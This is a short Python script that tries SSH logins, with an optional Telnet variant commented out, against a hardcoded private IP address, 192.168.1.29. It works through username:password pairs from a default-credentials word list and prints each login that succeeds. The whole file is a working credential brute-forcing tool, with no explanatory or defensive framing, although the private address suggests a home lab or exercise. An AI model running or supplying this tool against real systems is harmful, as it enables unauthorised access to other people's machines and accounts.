import paramiko
import telnetlib

def SSHLogin(host,port,username,password):
    try:
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host,port=port,username=username,password=password)
        ssh_session=ssh.get_transport().open_session()
        if ssh_session.active:
            print("SSH login successful on %s:%s with username %s and password %s"%(host,port,username,password))
    except Exception as e:
        return 
    ssh.close()


def TelnetLogin(host,port,username,password):
    user=bytes(username+"\n","utf-8")
    passwd=bytes(password+"\n","utf-8")

    tn=telnetlib.Telnet(host,port)
    tn.read_until(bytes("login: ","utf-8"))
    tn.write(user)
    tn.read_until(bytes("Password: ","utf-8"))
    tn.write(passwd)
    try:
        result=tn.expect([bytes("Last login","utf-8")],timeout=2)
        if(result[0]>=0):
            print("Telnet login successful on %s:%s with username %s and password %s" %(host,port,username,password))
        tn.close()
    except EOFError:
        print("Login failed %s %s" %(username,password))



host="192.168.1.29"

with open(".\word-lists\defaults.txt","r") as f:
    for line in f:
        vals=line.split(":")
        username=vals[0].strip()
        password=vals[1].strip()
        print("Testing:",vals[0],vals[1])
        SSHLogin(host,22,username,password)
        # TelnetLogin(host,23,username,password)

    